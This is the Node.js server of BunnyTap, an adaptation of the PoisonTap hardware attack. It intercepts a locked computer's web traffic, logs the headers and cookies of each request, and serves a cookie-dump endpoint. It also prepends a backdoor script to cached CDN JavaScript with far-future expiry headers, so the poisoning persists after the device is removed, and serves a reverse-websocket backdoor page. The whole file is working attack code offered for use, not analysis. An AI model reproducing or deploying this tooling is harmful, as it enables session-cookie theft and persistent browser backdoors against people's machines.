/*
 * BunnyTap 
 *  by Whistle Master
 *
 * based on
 *
 * PoisonTap
 *  by samy kamkar
 *  http://samy.pl/poisontap
 *  01/08/2016
 * 
 */

var http = require("http");
var https = require('https');
var exec = require('child_process').exec;
var fs = require('fs');
var util = require('util');
var backdoorPreJs = fs.readFileSync(__dirname + '/target_backdoor.js'); // this gets prepended before legit js, eg jquery.js
var backdoorHtml = fs.readFileSync(__dirname + '/backdoor.html');

/* Gachnang 'counter' start */
var path = require('path');
var log_file_count = 0;
while (path.existsSync(__dirname + '/poisontap.' + log_file_count + '.cookies.log', {flags : 'a'})){
	log_file_count++;
}
var log_file = fs.createWriteStream(__dirname + '/poisontap.' + log_file_count + '.cookies.log', {flags : 'a'});
/* Gachnang 'counter' end */
/* before, instead of 'counter', here was: var log_file = fs.createWriteStream(__dirname + '/poisontap.cookies.log', {flags : 'a'}); */

var log_stdout = process.stdout;
var replacejs = fs.readdirSync(__dirname + '/js');
var blinked = false;
var repobj = {};
for (var i in replacejs)
	repobj[replacejs[i].replace(/__/g, '/')] = fs.readFileSync(__dirname + '/js/' + replacejs[i]);

console.log = function(d) {
  log_file.write(util.format(d) + '\n');
  log_stdout.write(util.format(d) + '\n');
};

var startBlinking = function() {
	// Configuration
	var BLINK_MAX = 20;
	var BLINK_SPEED = 100;

	// Blinking function
	var util = require('util'), exec = require('child_process').exec, child;
	var oldState = 1;
	var count = 0;

	var changeLedState = function(state) {
		oldState = state;
		child = exec('nice -n -20 echo '+state+' | sudo tee /sys/class/gpio_sw/PL7/data');
	}

	var blink = function() {
		changeLedState(oldState == 1 ? 0 : 1);
		count++;
		
		if (count <= BLINK_MAX + 1) {
			setTimeout(blink, BLINK_SPEED);
		} else {
			changeLedState(1);
			setTimeout(function(){changeLedState(0)},3000);
		}
	}

	blink();
};

var xhtml = fs.readFileSync(__dirname + '/target_injected_xhtmljs.html', 'utf8');
if (!xhtml)
{
	console.log("Couldn't read PoisonTap evil html");
	process.exit();
}

/* Gachnang 'config' start*/
var config;
var configDefault = JSON.parse('{ "onFinished": 0, "finishOnBunnyAway": 0, "useTop1m": 0 }');
// config-file exists?
if(path.existsSync(__dirname + '/BunnyTap.json', {flags : 'a'})){
	// read
	config = fs.readFileSync(__dirname + '/BunnyTap.json');
	if (config)
	{
		// change displayAnimation
		if(xhtml) {
			var index = xhtml.indexOf('var displayAnimation = ');
			if(index != -1){
				config = JSON.parse(config);
				if(config.hasOwnProperty('displayAnimation')){			
					var semicolon = xhtml.substring(index).indexOf(';');
					var aniOld = xhtml.substring(index, index + semicolon);
					var aniNew = 'var displayAnimation = ' + config.displayAnimation + ';';
					
					xhtml = xhtml.replace(aniOld, aniNew);
				}
			}
		}
	} else {
		console.log("Couldn't read '" + __dirname + "/BunnyTap.json' > Set default");
		config = configDefault;
	}
} else {
	console.log("Couldn't find '" + __dirname + "/BunnyTap.json' > Set default");
	config = configDefault;
}
/* Gachnang 'config' end */

/* Gachnang 'top-1m' start */
var top1m;
var askedForTop1m = false;
if(path.existsSync(__dirname + '/top-1m.csv', {flags : 'a'})){
	top1m = fs.readFileSync(__dirname + '/top-1m.csv');
	if (!top1m) {
		console.log("Couldn't read '" + __dirname + '/top-1m.csv"');
		// onFinished : finishOnBunnyAway
	} else {
		// split by each row
		top1m = top1m.toString().split(/\r?\n/);
	}
} else {
	console.log("Couldn't find '" + __dirname + '/top-1m.csv"');
	config.useTop1m = 0;
}
/* Gachnang 'top-1m' end */

var serverHttp = http.createServer(function(request, response) {
	var url = request.headers.host + request.url;
	console.log('Request: ' + url);
	console.log(request.headers);

	var headers = {
		"Content-Type": "text/html",
		"Server": "PoisonTap/1.0 SamyKamkar/0.1",
		"Cache-Control": "public, max-age=99936000",
		"Expires": "Sat, 26 Jul 2040 05:00:00 GMT",
		"Last-Modified": "Tue, 15 Nov 1994 12:45:26 GMT",
		"Access-Control-Allow-Origin": "*",
		"Access-Control-Allow-Methods":"GET, POST, OPTIONS, PUT, PATCH, DELETE",
		"Access-Control-Allow-Headers":"X-Requested-With,content-type",
		"Access-Control-Allow-Credentials":true,
		
	};
	
	// cache for a very long time to poison future requests after we're gone
	if (repobj[url])
	{
		console.log('>>> Known CDN');
		response.writeHead(200, headers);
		response.write(backdoorPreJs);
		response.write(repobj[url]);
		response.end();
		return;
	}

	// if this is a poisontap request, we just siphoned cookies, now drop html backdoor
	else if (url.indexOf('/PoisonTap') != -1)
	{
		// Blink ACT led on RPi to know if the injection is going well
		if (!blinked) {
			blinked = true;
			startBlinking();
		}
		
		console.log('>>> Inject Backdoor HTML reverse ws 1337');
		response.writeHead(200, headers);
		response.write(backdoorHtml);
		response.end();
		return;
	}
	
	// Gachnang 'config' and 'finished' start
	else if (url.indexOf('/BunnyTap') != -1)
	{
		// script ask, if BunnyTab still reachable
		console.log('>>> BunnyTap');
		response.writeHead(200, {'Content-Type': 'application/json'});
		
		//Blink short
		if(!askedForTop1m){
			exec('LED G 10');
			setTimeout(function(){ exec('LED B 0'); }, 500);
		} else {
			exec('LED B 100');
			//setTimeout(function(){ exec('LED B 0'); }, 500);			
		}
		// return config
		response.write(JSON.stringify(config));
		response.end();
	}
	// Gachnang 'finished' end
	
	// Gachnang 'top-1m' start
	else if (url.indexOf('/top-1m') != -1)
	{
		console.log('>>> ask for top-1m');
		askedForTop1m=true;
		var ret = { 'status': 0 };
		
		if(config.hasOwnProperty('useTop1m')) {
			ret.useTop1m = config.useTop1m;
			
			if(config.useTop1m == 1){
				if(top1m){
					response.writeHead(200, {'Content-Type': 'application/json'});
					// expect 'http://xxx.xx/top-1m/{start}/{stop}'
					var a = url.indexOf('/top-1m') + ('/top-1m').length + 1;
					var param = url.substring(a).split('/');
					
					if(param[0] && param[1]){
						var start = param[0];
						var stop = param[1];
						
						// search in csv
						ret.data= top1m.slice(start, stop);
						ret.status = 1;	
						
						console.log('>>> top-1m: Start='+start+', Stop='+stop);														
					} else {
						// param-error: wrong request
						console.log('>>> top-1m: Parameter not recognized='+url.substring(a)+', arr='+JSON.stringify(param));
					}		
				} 
				else {
					// data not loaded
					console.log('>>> top-1m: Could not load data');
				}				
			} 
			else {
				// useTop1m is false
				console.log('>>> top-1m is disabled');
			}
		
		} else {
			// config not set
			console.log('>>> config has "top-1m" not set');			
		}
		response.write(JSON.stringify(ret));
		response.end();
		return;
	}
	// Gachnang 'top-1m' end
	
	// if this is a cookie dump request, return cookie file.  CORS header required to make it work
	else if (url.indexOf('/PoisonCookieDump') != -1)
	{
		console.log('>>> Cookie Dump');
		response.writeHead(200, headers);
		/* Gachnang 'counter' start */
		response.write(fs.readFileSync(__dirname + '/poisontap.' + log_file_count + '.cookies.log'));
		/* Gachnang 'counter' end */
		/* before, instead of 'counter', here was: response.write(fs.readFileSync(__dirname + '/poisontap.cookies.log'));*/
		response.end();
		return;
	}
	
  // random AJAX request or load from a page, give our evil content that loads all the backdoors and siphons all the things
	else
	{
		console.log('>>> Inject Target xhtmljs');
		response.writeHead(200, headers);

		// NOT poisontap hit, inject cross-js/html file
		response.write(xhtml);
		response.end();
		
		return;
	}
});
serverHttp.listen(1337);

/* Gachnang 'httpS' start */
/* 	Browser dont trust self signed certificate... 
	HSTS redirect some pages to https although we request http...
	
var serverHttps;
if(path.existsSync(__dirname + '/key.pem', {flags : 'a'}) && path.existsSync(__dirname + '/cert.pem', {flags : 'a'})){
	
	const options = {
		key: fs.readFileSync(__dirname + '/key.pem', 'utf8'),
		cert: fs.readFileSync(__dirname + '/server.crt', 'utf8')
	};
	
	serverHttps = https.createServer(options, function(request, response) {
		var url = request.headers.host + request.url;
		console.log('Request: ' + url);
		console.log(request.headers);
		
		// redirect to http
		response.writeHead(302, {
			'Location': 'http://' + url
		});
		
		response.end();
		return;
	});

	serverHttps.listen(1338);
} else {
	console.log("Couldn't find '" + __dirname + '/key.pem" and "../cert.pem" : Https not running');
}*/
/* Gachnang 'httpS' end */

console.log("==== "+new Date().toJSON()+" ["+Date.now()+"] ====");
console.log("PoisonTap is listening");
